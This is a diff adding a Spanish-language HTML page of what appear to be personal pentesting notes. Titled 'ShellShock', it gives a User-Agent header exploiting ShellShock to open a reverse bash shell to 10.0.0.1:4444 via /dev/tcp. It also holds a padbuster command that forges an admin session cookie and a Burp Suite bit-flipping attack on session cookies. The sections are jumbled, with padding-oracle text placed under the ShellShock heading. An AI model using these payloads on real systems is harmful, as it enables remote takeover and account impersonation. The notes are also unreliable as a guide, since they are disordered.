@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>ShellShock</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>ShellShock</h1><br/><strong><span style="text-decoration:underline;">PADBUSTER</span></strong><br /><br />Para comprobar que estamos ante un ataque ShellShock debemos mirar en la URL de la web y ver que la extension de la pagina es pl,cgi,sh,etc. Para hacer un ataque ShellShock cambiaremos el user agent por un comando que queramos ejecutar en el sistema<br /><br /><span style="color:#d50cbb;">User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><br /><br />El numero 8 es el numero de bloques de encriptacion que podra variar. Una vez realizado esto sacaremos el texto en plano de la cookie por lo que podremos jugar con ella para hacernos pasar por ejemplo por el usuario admin<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;padbuster&nbsp;http://10.0.0.1/login.php&nbsp;lacookieencriptada&nbsp;8&nbsp;-cookie&nbsp;&quot;nombredelacookie=lacookieencriptada&quot;&nbsp;-encoding&nbsp;0&nbsp;-plaintext&nbsp;&quot;user=admin&quot;<br /></div></div><br /><br />Una vez que nos saque la cookie la introduciremos en el navegador para asi poder loguear como admin<br /><br /><br /><strong><span style="text-decoration:underline;">FLIPPER ATTACK BURPSUITE</span></strong><br /><br />Como la encriptacion se realiza por bloques podemos jugar con estos para obtener un usuario, por ejemplo podemos usar bdmin como usuario ya que el bloque que cambiara sera el primero ya que la parte de “dmin” sera igual a la de admin    <br /><br />Para ello en el panel de intruder del burpsuite cambiaremos la cookie de sesion, para configurarlo en payload type seleccionaremos la opcion &quot;Bit Flipper&quot; y en las opciones de bit flipper seleccionamos la opcion “Literal Value”<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
+</body>
+</html>
